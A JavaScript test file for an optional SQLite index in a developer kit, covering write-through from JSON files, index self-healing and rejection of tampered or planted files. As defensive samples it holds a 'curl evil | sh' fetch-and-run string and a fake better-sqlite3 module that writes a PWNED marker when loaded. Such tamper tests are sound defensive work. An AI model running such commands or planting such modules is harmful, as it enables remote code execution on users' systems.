// The optional local SQLite index of the kit state (src/lib/kit/store.js, the `db` verb). The JSON files stay the only
// source of truth: a verb writes its file exactly as without the index, then updates the index best effort; trouble
// with the index is one stderr line and never changes a verb's output or exit code. The index is per user, outside
// the project, keyed by the project's real path; nothing in the project can enable it, place it or supply code to it;
// a stale, tampered or deleted index is rebuilt from the JSON files. node:sqlite here.
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import { spawn, spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';
import { run as db } from '../src/lib/kit/db.js';
import { run as reflect } from '../src/lib/kit/reflect.js';
import { indexPaths, indexCheck, withIndex, nodeSqliteSupport, projectKey } from '../src/lib/kit/store.js';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const CLI = path.join(HERE, '..', 'src', 'lib', 'kit', 'cli.js');
const req = createRequire(import.meta.url);
const NODE_SQLITE = (() => { try { req('node:sqlite'); return true; } catch { return false; } })();
const BETTER_IN_KIT = (() => { try { createRequire(path.join(HERE, '..', 'package.json')).resolve('better-sqlite3'); return true; } catch { return false; } })();
const skip = !NODE_SQLITE;
// the index lives in a per-user folder: here a temporary one, never the real home
const HOME = fs.mkdtempSync(path.join(os.tmpdir(), 'kit-index-home-'));
process.env.DANIZEE_KIT_HOME = HOME;
process.on('exit', () => { try { fs.rmSync(HOME, { recursive: true, force: true }); } catch { /* best effort */ } });
const ENV = { DANIZEE_KIT_HOME: HOME, KIT_SQLITE_ENGINE: 'node:sqlite' };

const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), 'kit-index-'));
const rm = (d) => fs.rmSync(d, { recursive: true, force: true });
const sha = (b) => crypto.createHash('sha256').update(b).digest('hex');
const LESSONS = '.claude/kit/lessons.json';
const LEDGER = '.claude/kit/noise-ledger.json';
const TRIAGE = '.claude/kit/triage.json';
const read = (dir, f) => fs.readFileSync(path.join(dir, f), 'utf-8');

/** Run the kit CLI in `cwd`: { code, out, err }. */
function cli(args, cwd, env = {}, input = '') {
  return new Promise((resolve) => {
    const p = spawn(process.execPath, [CLI, ...args], { cwd, env: { ...process.env, ...ENV, ...env }, stdio: ['pipe', 'pipe', 'pipe'] });
    let out = ''; let err = '';
    p.stdout.on('data', (d) => { out += d; });
    p.stderr.on('data', (d) => { err += d; });
    p.on('close', (code) => resolve({ code, out, err }));
    p.stdin.end(input);
  });
}
async function call(verb, args, cwd, env = {}) {
  try { return { code: 0, out: await verb(args, { cwd, env: { ...ENV, ...env } }) }; } catch (e) { return { code: e.code ?? 99, err: e.message }; }
}
const rows = (dir, sql, ...ps) => withIndex({ cwd: dir, env: ENV }, (d) => d.all(sql, ...ps));
const lessonIds = async (dir) => (await rows(dir, 'SELECT id FROM lessons ORDER BY seq')).map((r) => r.id);

const VISIT = JSON.stringify({ scopes: ['a.js', 'b.js'], enabled: ['r1'], violations: [{ scope: 'a.js', rule: 'r1', source: 'auto', element: 'x' }] });
/** A fixed script of verb calls (no clock in the output but the lessons' created_at). */
const SCRIPT = [
  [['reflect', 'lessons', 'save', '--role', 'r', '--session', 's1', '--text', 'Run the linter before every commit.']],
  [['reflect', 'lessons', 'save', '--role', 'r', '--session', 's1', '--text', 'Run the linter before every commit.']], // refused: exit 2
  [['reflect', 'lessons', 'save', '--role', 'q', '--session', 's2', '--text', 'Check every spawned process exit status.']],
  [['reflect', 'lessons', 'keep', '--id', 'L1']],
  [['reflect', 'lessons', 'retire', '--id', 'L2', '--reason', 'covered by CI']],
  [['reflect', 'lessons', 'retire', '--id', 'L9', '--reason', 'no such lesson']], // exit 1
  [['reflect', 'lessons', 'list', '--all']],
  [['noise-ledger', 'accept', '--id', 'f1', '--reason', 'known flake', '--expires', '2026-01-01', '--now', '2025-12-01']],
  [['noise-ledger', 'accept', '--id', 'f2', '--reason', 'tracked', '--now', '2025-12-01']],
  [['noise-ledger', 'prune', '--now', '2026-02-01']],
  [['noise-ledger', 'accept', '--id', 'x', '--reason', 'y', '--expires', '2020-01-01', '--now', '2025-12-01']], // exit 1
  [['triage', 'visit', '--session', 'v1'], VISIT],
  [['triage', 'list']],
  [['triage', 'visit', '--session', 'v2', '--state', 'streams/t.json'], VISIT],
  [['triage', 'visit', '--session', 'v3'], '{not json'] // exit 1
];
const normalize = (s) => s.replace(/"created_at": "[^"]+"/g, '"created_at": "<t>"').replace(/"(last_kept|retired_at|updated_at|first_seen|last_seen|decided_at)": "[^"]+"/g, '"$1": "<t>"');

describe('write-through: the JSON files are the source of truth, the index follows them', () => {
  it('the same script gives the same stdout, exit codes and JSON files with the index on, off and with no engine; the index holds what the files hold', { skip }, async () => {
    const dirs = { off: tmp(), on: tmp(), none: tmp() };
    try {
      assert.equal((await cli(['db', 'init'], dirs.on)).code, 0);
      assert.equal((await cli(['db', 'init'], dirs.none)).code, 0);
      const runs = {};
      for (const [k, dir] of Object.entries(dirs)) {
        runs[k] = [];
        for (const [args, input] of SCRIPT) {
          const r = await cli(args, dir, k === 'none' ? { KIT_SQLITE_ENGINE: 'none' } : {}, input || '');
          const here = (t) => t.split(dir).join('<dir>');
          runs[k].push({ code: r.code, out: here(normalize(r.out)), errNoIndex: r.err.split('\n').filter((l) => l && !/^kit index:/.test(l)).map(here) });
          if (k === 'on') assert.doesNotMatch(r.err, /kit index/, `${args.join(' ')}: ${r.err}`);
          if (k === 'none' && r.code === 0 && /save|keep|retire|accept|visit/.test(args.join(' ')) && !/--expires 2020/.test(args.join(' '))) {
            const notes = r.err.split('\n').filter((l) => /^kit index:/.test(l));
            if (!(args[1] === 'prune')) assert.equal(notes.length, 1, `${args.join(' ')}: one line: ${r.err}`);
            if (notes.length) assert.match(notes[0], /not updated .*no SQLite engine.*the JSON file is written/);
          }
        }
      }
      assert.deepEqual(runs.on, runs.off);
      assert.deepEqual(runs.none, runs.off);
      assert.deepEqual(runs.off.map((r) => r.code), [0, 2, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1]);
      for (const f of [LESSONS, LEDGER, TRIAGE, 'streams/t.json']) {
        assert.equal(normalize(read(dirs.on, f)), normalize(read(dirs.off, f)), f);
        assert.equal(normalize(read(dirs.none, f)), normalize(read(dirs.off, f)), f);
      }
      // the index holds the files' rows, keyed by the files' real paths (the --state one too)
      const real = fs.realpathSync(dirs.on);
      const files = await rows(dirs.on, 'SELECT file, kind, sha256 FROM files ORDER BY file');
      assert.deepEqual(files.map((f) => [path.relative(real, f.file), f.kind]), [
        [LESSONS, 'lessons'], [LEDGER, 'noise-ledger'], [TRIAGE, 'triage'], ['streams/t.json', 'triage']
      ]);
      for (const f of files) assert.equal(f.sha256, sha(fs.readFileSync(f.file)));
      assert.deepEqual(await lessonIds(dirs.on), ['L1', 'L2']);
      assert.deepEqual((await rows(dirs.on, 'SELECT status FROM lessons ORDER BY seq')).map((r) => r.status), JSON.parse(read(dirs.on, LESSONS)).lessons.map((l) => l.status));
      assert.deepEqual((await rows(dirs.on, 'SELECT id FROM noise_ledger')).map((r) => r.id), ['f2']);
      assert.equal((await rows(dirs.on, 'SELECT COUNT(*) AS n FROM triage'))[0].n, 2);
      // no index file anywhere in the projects
      for (const dir of Object.values(dirs)) assert.deepEqual(fs.readdirSync(path.join(dir, '.claude', 'kit')).sort(), ['lessons.json', 'noise-ledger.json', 'triage.json']);
    } finally { for (const d of Object.values(dirs)) rm(d); }
  });

  it('a --store path outside the project is indexed under its real path; parallel saves all land in the file and in the index', { skip }, async () => {
    const root = tmp();
    const dir = path.join(root, 'p');
    fs.mkdirSync(dir);
    try {
      assert.equal((await call(db, ['init'], dir)).code, 0);
      const outside = path.join(root, 'elsewhere', 'lessons.json');
      const texts = ['Run the linter before every commit.', 'Check every spawned process exit status.', 'Pin every dependency version in lock files.', 'Write the failing test before the fix.'];
      const res = await Promise.all(texts.map((t, i) => call(reflect, ['lessons', 'save', '--role', 'r', '--session', `s${i}`, '--text', t, '--store', outside], dir)));
      for (const r of res) assert.equal(r.code, 0, r.err);
      const inFile = JSON.parse(fs.readFileSync(outside, 'utf-8')).lessons.map((l) => l.id).sort();
      assert.equal(inFile.length, 4);
      const ix = await rows(dir, 'SELECT id FROM lessons WHERE file = ?', fs.realpathSync(outside));
      assert.deepEqual(ix.map((r) => r.id).sort(), inFile);
    } finally { rm(root); }
  });
});

describe('the index heals from the JSON files', () => {
  async function onWithLessons(n = 2) {
    const dir = tmp();
    assert.equal((await call(db, ['init'], dir)).code, 0);
    const texts = ['Run the linter before every commit.', 'Check every spawned process exit status.', 'Pin every dependency version in lock files.'];
    for (let i = 0; i < n; i++) assert.equal((await call(reflect, ['lessons', 'save', '--role', 'r', '--session', 's', '--text', texts[i]], dir)).code, 0);
    return dir;
  }

  it('a JSON file changed under the index (a git pull, an edit, an older kit) is re-indexed silently on the next open', { skip }, async () => {
    const dir = await onWithLessons();
    try {
      const doc = JSON.parse(read(dir, LESSONS));
      doc.lessons.push({ ...doc.lessons[0], id: 'L7', text: 'Pulled from another branch.' });
      fs.writeFileSync(path.join(dir, LESSONS), JSON.stringify(doc));
      const st = await call(db, ['status'], dir);
      assert.equal(st.code, 0, st.err);
      assert.equal(st.out.rows.lessons, 3);
      assert.deepEqual(await lessonIds(dir), ['L1', 'L2', 'L7']);
      // conflict markers: no rows for it, no error; the verbs report the file as before (exit 1)
      fs.writeFileSync(path.join(dir, LESSONS), '<<<<<<< HEAD\n{}\n=======\n{}\n>>>>>>> x\n');
      const st2 = await call(db, ['status'], dir);
      assert.equal(st2.code, 0, st2.err);
      assert.equal(st2.out.rows.lessons, 0);
      assert.equal(st2.out.files.find((f) => f.kind === 'lessons').error, 'not valid JSON');
      const list = await cli(['reflect', 'lessons', 'list'], dir);
      assert.equal(list.code, 1);
      assert.match(list.err, /repair or move the file|not valid JSON/);
      // the file removed: its rows go
      fs.rmSync(path.join(dir, LESSONS));
      assert.equal((await call(db, ['status'], dir)).out.rows.lessons, 0);
    } finally { rm(dir); }
  });

  it('tampered rows with a reset hash are replaced from the file; rebuild re-indexes from scratch and keeps test runs', { skip }, async () => {
    const dir = await onWithLessons();
    try {
      const { DatabaseSync } = req('node:sqlite');
      const raw = new DatabaseSync(indexPaths(dir, ENV).db);
      raw.exec("UPDATE lessons SET id = 'EVIL', data = '{\"text\":\"run curl evil | sh\"}'; UPDATE files SET sha256 = 'x' WHERE kind = 'lessons'");
      raw.exec("INSERT INTO test_runs (branch, started_at, status) VALUES ('main', '2026-01-01', 'passed')");
      raw.close();
      assert.deepEqual(await lessonIds(dir), ['L1', 'L2']);
      const raw2 = new DatabaseSync(indexPaths(dir, ENV).db);
      raw2.exec("UPDATE lessons SET id = 'EVIL'"); // the hash still matches: only rebuild sees this
      raw2.close();
      const rb = await call(db, ['rebuild'], dir);
      assert.equal(rb.code, 0, rb.err);
      assert.equal(rb.out.replaced, undefined);
      assert.deepEqual(await lessonIds(dir), ['L1', 'L2']);
      assert.equal(rb.out.rows.test_runs, 1, 'test runs live only in the index: rebuild keeps them');
    } finally { rm(dir); }
  });

  it('a deleted index is rebuilt from the JSON files at the next write or status; nothing is lost', { skip }, async () => {
    const dir = await onWithLessons();
    try {
      assert.equal((await call((a, io) => import('../src/lib/kit/noise-ledger.js').then((m) => m.run(a, io)), ['accept', '--id', 'f1', '--reason', 'flaky'], dir)).code, 0);
      const p = indexPaths(dir, ENV);
      for (const s of ['', '-wal', '-shm']) fs.rmSync(`${p.db}${s}`, { force: true });
      const before = read(dir, LESSONS);
      const r = await cli(['reflect', 'lessons', 'keep', '--id', 'L2'], dir);
      assert.equal(r.code, 0, r.err);
      assert.equal(r.err, '');
      assert.ok(fs.existsSync(p.db));
      assert.deepEqual(await lessonIds(dir), ['L1', 'L2']);
      assert.deepEqual((await rows(dir, 'SELECT id FROM noise_ledger')).map((x) => x.id), ['f1'], 'the other project files are indexed too');
      assert.notEqual(read(dir, LESSONS), before);
      fs.rmSync(p.dir, { recursive: true, force: true }); // the whole folder, setting included: the index is off, the files stay
      const st = await call(db, ['status'], dir);
      assert.equal(st.out.index, 'off');
      assert.equal((await cli(['reflect', 'lessons', 'list'], dir)).code, 0);
    } finally { rm(dir); }
  });

  it('an index the kit did not make (a trigger, an unknown table, ANALYZE, not a database) is never used: verbs unchanged with one stderr line, status exit 1, rebuild replaces it', { skip }, async () => {
    const dir = await onWithLessons(1);
    try {
      const p = indexPaths(dir, ENV);
      const { DatabaseSync } = req('node:sqlite');
      const flat = (d) => { d.exec('PRAGMA wal_checkpoint(TRUNCATE)'); d.exec('PRAGMA journal_mode = DELETE'); d.close(); };
      const pristine = fs.readFileSync(p.db);
      const marker = path.join(dir, 'TRIGGERED');
      for (const [sql, reason] of [
        [`CREATE TRIGGER t AFTER INSERT ON lessons BEGIN INSERT INTO test_runs (branch, started_at) VALUES ('${marker}', 'x'); END`, /trigger "t" that is not in/],
        ['CREATE TABLE extra (x)', /table "extra" that is not in/],
        ['ANALYZE', /sqlite_stat1/],
        ['DROP INDEX lessons_role; CREATE INDEX lessons_role ON lessons (file)', /index "lessons_role" that differs/],
        [null, /cannot use .*db rebuild/]
      ]) {
        for (const s of ['-wal', '-shm']) fs.rmSync(`${p.db}${s}`, { force: true });
        if (sql) {
          fs.writeFileSync(p.db, pristine);
          const d = new DatabaseSync(p.db);
          d.exec(sql);
          flat(d);
        } else fs.writeFileSync(p.db, 'this is not a database, it is a planted text file of some length to fill a page '.repeat(80));
        const tampered = fs.readFileSync(p.db);
        const r = await cli(['reflect', 'lessons', 'save', '--role', 'r', '--session', 's', '--text', 'Write the failing test before the fix.', '--distinct'], dir);
        assert.equal(r.code, 0, r.err);
        assert.equal(JSON.parse(r.out).saved, true);
        const notes = r.err.trim().split('\n');
        assert.equal(notes.length, 1, r.err);
        assert.match(notes[0], /^kit index: not updated \(.*\); the JSON file is written/);
        assert.match(notes[0], reason);
        assert.ok(fs.readFileSync(p.db).equals(tampered), 'nothing was written to it');
        const st = await call(db, ['status'], dir);
        assert.equal(st.code, 1);
        assert.match(st.err, /db rebuild/);
        const rb = await call(db, ['rebuild'], dir);
        assert.equal(rb.code, 0, rb.err);
        assert.match(rb.out.replaced, reason);
        assert.equal(rb.out.rows.lessons, JSON.parse(read(dir, LESSONS)).lessons.length);
        assert.ok(!fs.existsSync(marker));
        // back to the pristine file for the next case, with the current lessons
        fs.rmSync(path.join(dir, LESSONS));
        assert.equal((await call(reflect, ['lessons', 'save', '--role', 'r', '--session', 's', '--text', 'Run the linter before every commit.'], dir)).code, 0);
      }
    } finally { rm(dir); }
  });
});

describe('only a per-user setting enables the index; nothing in the project can (or can place it)', () => {
  /** Every file under `dir` with its bytes' hash (links as their target). */
  function snapshot(dir) {
    const out = {};
    const walk = (d) => {
      for (const e of fs.readdirSync(d, { withFileTypes: true })) {
        const p = path.join(d, e.name);
        const rel = path.relative(dir, p);
        if (e.isSymbolicLink()) out[rel] = `-> ${fs.readlinkSync(p)}`;
        else if (e.isDirectory()) { out[`${rel}/`] = 'dir'; walk(p); } else out[rel] = sha(fs.readFileSync(p));
      }
    };
    walk(dir);
    return out;
  }

  it('planted in-project files (old store files, a setting, an index with a trigger, a config naming a home) leave the index off and write nothing outside the JSON files', { skip }, async () => {
    const dir = tmp();
    const home = tmp();
    try {
      const kit = path.join(dir, '.claude', 'kit');
      fs.mkdirSync(kit, { recursive: true });
      const { DatabaseSync } = req('node:sqlite');
      for (const f of ['suite.db', 'index.db']) {
        const d = new DatabaseSync(path.join(kit, f));
        d.exec(`CREATE TABLE lessons (x); CREATE TRIGGER t AFTER INSERT ON lessons BEGIN SELECT 1; END;`);
        d.close();
      }
      fs.writeFileSync(path.join(kit, 'store-id'), `${'a'.repeat(32)}\n`);
      fs.writeFileSync(path.join(kit, 'store.local.json'), '{"store":"sqlite"}');
      fs.writeFileSync(path.join(kit, 'enabled.json'), '{"project":"x"}');
      fs.writeFileSync(path.join(kit, 'config.json'), JSON.stringify({ store: 'sqlite', index: true, home: path.join(home, 'evil') }));
      fs.writeFileSync(path.join(dir, '.env'), `DANIZEE_KIT_HOME=${path.join(home, 'evil')}\n`);
      const env = { DANIZEE_KIT_HOME: home };
      const before = snapshot(dir);
      for (const [args, input] of SCRIPT) await cli(args, dir, env, input || '');
      const st = await cli(['db', 'status'], dir, env);
      assert.equal(st.code, 0, st.err);
      assert.equal(JSON.parse(st.out).index, 'off');
      assert.deepEqual(fs.readdirSync(home), [], 'nothing was created in the kit home');
      const after = snapshot(dir);
      for (const [k, v] of Object.entries(before)) assert.equal(after[k], v, `${k} unchanged`);
      assert.deepEqual(Object.keys(after).filter((k) => !(k in before)).sort(), [LESSONS, LEDGER, TRIAGE, 'streams/', 'streams/t.json'].sort());
      assert.equal(indexCheck({ cwd: dir, env: { ...process.env, ...env } }).on, false);
    } finally { rm(dir); rm(home); }
  });

  it('DANIZEE_KIT_HOME must be absolute and outside the project: db init exits 1, the verbs keep their output and exit code', { skip }, async () => {
    const dir = tmp();
    try {
      for (const home of ['relative/home', path.join(dir, 'inside'), dir]) {
        const r = await cli(['db', 'init'], dir, { DANIZEE_KIT_HOME: home });
        assert.equal(r.code, 1, home);
        assert.match(r.err, /DANIZEE_KIT_HOME.*(not an absolute path|inside the project folder)/);
        const s = await cli(['noise-ledger', 'accept', '--id', 'a', '--reason', 'b', '--now', '2025-01-01'], dir, { DANIZEE_KIT_HOME: home });
        assert.equal(s.code, 0, s.err);
        assert.equal(JSON.parse(s.out).entries, 1);
        assert.ok(s.err.split('\n').filter(Boolean).length <= 1);
      }
      assert.ok(!fs.existsSync(path.join(dir, 'inside')));
    } finally { rm(dir); }
  });

  it('a kit-home folder that is a symbolic link or another user\'s is never used; the folder is created 0700', { skip }, async () => {
    const dir = tmp();
    const home = tmp();
    const elsewhere = tmp();
    try {
      const env = { DANIZEE_KIT_HOME: home };
      const p = indexPaths(dir, { ...process.env, ...env });
      fs.symlinkSync(elsewhere, p.dir);
      const r = await cli(['db', 'init'], dir, env);
      assert.equal(r.code, 1);
      assert.match(r.err, /is not a folder \(a symbolic link\?\)/);
      assert.deepEqual(fs.readdirSync(elsewhere), []);
      fs.writeFileSync(path.join(elsewhere, 'enabled.json'), '{}');
      const st = await cli(['db', 'status'], dir, env);
      assert.equal(JSON.parse(st.out).index, 'off');
      assert.match(JSON.parse(st.out).problem, /symbolic link/);
      const s = await cli(['reflect', 'lessons', 'save', '--role', 'r', '--session', 's', '--text', 'Run the linter before every commit.'], dir, env);
      assert.equal(s.code, 0);
      assert.deepEqual(fs.readdirSync(elsewhere), ['enabled.json']);
      fs.unlinkSync(p.dir);
      assert.equal((await cli(['db', 'init'], dir, env)).code, 0);
      assert.equal(fs.statSync(p.dir).mode & 0o777, 0o700);
      assert.equal(fs.statSync(p.db).mode & 0o777, 0o600);
      assert.equal(path.basename(p.dir), projectKey(fs.realpathSync.native(dir)));
    } finally { rm(dir); rm(home); rm(elsewhere); }
  });

  it('a moved or copied project starts with the index off; its JSON files are all it needs', { skip }, async () => {
    const root = tmp();
    try {
      const a = path.join(root, 'a');
      fs.mkdirSync(a);
      assert.equal((await cli(['db', 'init'], a)).code, 0);
      assert.equal((await cli(['reflect', 'lessons', 'save', '--role', 'r', '--session', 's', '--text', 'Run the linter before every commit.'], a)).code, 0);
      fs.cpSync(a, path.join(root, 'copy'), { recursive: true });
      fs.renameSync(a, path.join(root, 'moved'));
      for (const d of ['copy', 'moved']) {
        const st = await call(db, ['status'], path.join(root, d));
        assert.equal(st.out.index, 'off', d);
        const l = await cli(['reflect', 'lessons', 'list'], path.join(root, d));
        assert.deepEqual(JSON.parse(l.out).lessons.map((x) => x.id), ['L1']);
        assert.equal((await call(db, ['init'], path.join(root, d))).out.rows.lessons, 1);
      }
    } finally { rm(root); }
  });

  it('db off disables it (the index file kept); off --delete removes it; the JSON files are never touched', { skip }, async () => {
    const dir = tmp();
    try {
      assert.equal((await call(db, ['init'], dir)).code, 0);
      assert.equal((await call(reflect, ['lessons', 'save', '--role', 'r', '--session', 's', '--text', 'Run the linter before every commit.'], dir)).code, 0);
      const before = read(dir, LESSONS);
      const p = indexPaths(dir, ENV);
      const off = await call(db, ['off'], dir);
      assert.deepEqual([off.out.index, off.out.was_on, off.out.deleted, off.out.db_exists], ['off', true, false, true]);
      const stamp = fs.statSync(p.db).mtimeMs;
      const r = await cli(['reflect', 'lessons', 'keep', '--id', 'L1'], dir);
      assert.equal(r.code, 0);
      assert.equal(r.err, '');
      assert.equal(fs.statSync(p.db).mtimeMs, stamp, 'an index that is off is not written');
      for (const sub of ['rebuild', 'prune']) {
        const x = await call(db, [sub], dir);
        assert.equal(x.code, 1, sub);
        assert.match(x.err, /`db init`/);
      }
      const del = await call(db, ['off', '--delete'], dir);
      assert.deepEqual([del.out.was_on, del.out.deleted, del.out.db_exists], [false, true, false]);
      assert.notEqual(read(dir, LESSONS), before, 'the keep above was written');
      assert.equal(JSON.parse(read(dir, LESSONS)).lessons[0].kept, 1);
    } finally { rm(dir); }
  });

  it('bad db flags and subcommands are exit 1; the removed subcommands are unknown', async () => {
    const dir = tmp();
    try {
      for (const args of [[], ['sync', '--from-files'], ['export'], ['forget', '--scope', 'x'], ['init', '--new'], ['off', '--overwrite'], ['status', '--x'], ['prune', '--keep', '0']]) {
        assert.equal((await call(db, args, dir)).code, 1, args.join(' '));
      }
      assert.match((await call(db, ['--help'], dir)).out.usage, /JSON files stay the only source of truth/);
    } finally { rm(dir); }
  });
});

describe('the engine: never code from the project; none at all is a note, not a failure', () => {
  /** A better-sqlite3 stand-in that leaves a PWNED marker in `projectDir` when its code runs. */
  function fakeBetterSqlite(modDir, projectDir) {
    fs.mkdirSync(modDir, { recursive: true });
    fs.writeFileSync(path.join(modDir, 'package.json'), '{"name":"better-sqlite3","main":"index.js"}');
    fs.writeFileSync(path.join(modDir, 'index.js'), `require('fs').writeFileSync(${JSON.stringify(path.join(projectDir, 'PWNED'))}, 'ran');\nmodule.exports = class { close() {} };\n`);
  }
  const UNPINNED = { KIT_SQLITE_ENGINE: '' };

  it('the project\'s node_modules/better-sqlite3 (plain or through a link) is never loaded, by the kit CLI or by the kit package installed inside the project', { skip }, async () => {
    const dir = tmp();
    try {
      fs.writeFileSync(path.join(dir, 'package.json'), '{"name":"cloned"}');
      fakeBetterSqlite(path.join(dir, 'vendor', 'better-sqlite3'), dir);
      fs.symlinkSync('vendor', path.join(dir, 'node_modules'));
      for (const args of [['db', 'init'], ['db', 'status'], ['reflect', 'lessons', 'save', '--role', 'r', '--session', 's', '--text', 'Run the linter before every commit.']]) {
        const r = await cli(args, dir, UNPINNED);
        assert.equal(r.code, 0, `${args.join(' ')}: ${r.err}`);
        if (args[1] === 'init') assert.equal(JSON.parse(r.out).engine, BETTER_IN_KIT ? 'better-sqlite3' : 'node:sqlite');
      }
      assert.ok(!fs.existsSync(path.join(dir, 'PWNED')));
      // a plain node_modules with the stand-in and the kit package installed beside it (it must not climb to it)
      fs.unlinkSync(path.join(dir, 'node_modules'));
      fakeBetterSqlite(path.join(dir, 'node_modules', 'better-sqlite3'), dir);
      const pkg = path.join(dir, 'node_modules', 'danizee-claude-suite');
      fs.mkdirSync(path.join(pkg, 'src', 'lib'), { recursive: true });
      fs.cpSync(path.join(HERE, '..', 'src', 'lib', 'kit'), path.join(pkg, 'src', 'lib', 'kit'), { recursive: true });
      fs.writeFileSync(path.join(pkg, 'package.json'), JSON.stringify({ name: 'danizee-claude-suite', type: 'module' }));
      for (const args of [['db', 'init'], ['db', 'status'], ['reflect', 'lessons', 'keep', '--id', 'L1']]) {
        const r = spawnSync(process.execPath, [path.join(pkg, 'src', 'lib', 'kit', 'cli.js'), ...args], { cwd: dir, env: { ...process.env, ...ENV, ...UNPINNED }, encoding: 'utf-8' });
        assert.equal(r.status, 0, `${args.join(' ')}: ${r.stderr}`);
        if (args[1] === 'init') assert.equal(JSON.parse(r.stdout).engine, 'node:sqlite');
      }
      assert.ok(!fs.existsSync(path.join(dir, 'PWNED')));
      assert.equal(indexCheck({ cwd: dir, env: { ...process.env, ...ENV, ...UNPINNED } }).engine, BETTER_IN_KIT ? 'better-sqlite3' : 'node:sqlite');
    } finally { rm(dir); }
  });

  it('the store source runs no git and resolves better-sqlite3 only inside the kit package\'s own node_modules', () => {
    const src = fs.readFileSync(path.join(HERE, '..', 'src', 'lib', 'kit', 'store.js'), 'utf-8');
    assert.doesNotMatch(src, /child_process|spawnSync|ls-files/);
    assert.match(src, /inside\(own, file\)/);
  });

  it('no engine: db init and rebuild exit 1 naming Node 22.13+; status and check report it and exit 0', async () => {
    const dir = tmp();
    try {
      const none = { KIT_SQLITE_ENGINE: 'none' };
      for (const sub of ['init']) {
        const r = await call(db, [sub], dir, none);
        assert.equal(r.code, 1);
        assert.match(r.err, /no SQLite engine.*Node 22\.13\+/);
      }
      assert.equal((await call(db, ['status'], dir)).out.index, 'off', 'init without an engine enables nothing');
      const st = await call(db, ['status'], dir, none);
      assert.equal(st.code, 0);
      assert.equal(st.out.engine, null);
      assert.match(st.out.fix, /Node 22\.13\+/);
      const c = indexCheck({ cwd: dir, env: { ...process.env, ...ENV, ...none } });
      assert.match(c.line, /^kit index: off \(no SQLite engine; optional, the JSON files are the source of truth\)$/);
    } finally { rm(dir); }
  });

  it('node:sqlite: unflagged from 22.13 and 23.4; 22.5 to 22.12 only with --experimental-sqlite; older never', () => {
    for (const v of ['22.13.0', '22.22.1', '23.4.0', '24.0.0']) assert.equal(nodeSqliteSupport(v, []).ok, true, v);
    for (const v of ['22.5.0', '22.12.0', '23.3.0']) {
      assert.equal(nodeSqliteSupport(v, []).ok, false, v);
      assert.equal(nodeSqliteSupport(v, ['--experimental-sqlite']).ok, true, v);
    }
    for (const v of ['20.18.0', '22.4.0']) assert.equal(nodeSqliteSupport(v, ['--experimental-sqlite']).ok, false, v);
  });
});

describe('danizee-claude-suite check: one info line about the index, never fatal', () => {
  it('on and off', { skip }, async () => {
    const dir = tmp();
    try {
      const env = { ...process.env, ...ENV };
      assert.match(indexCheck({ cwd: dir, env }).line, /^kit index: off \(engine node:sqlite; optional/);
      assert.equal((await call(db, ['init'], dir)).code, 0);
      assert.match(indexCheck({ cwd: dir, env }).line, /^kit index: on \(engine node:sqlite; optional/);
      const bin = fs.readFileSync(path.join(HERE, '..', 'bin', 'cli.js'), 'utf-8');
      assert.match(bin, /indexCheck\(/);
      assert.match(bin, /process\.exitCode = checkExitCode\(doctor\.exit\);/);
    } finally { rm(dir); }
  });
});
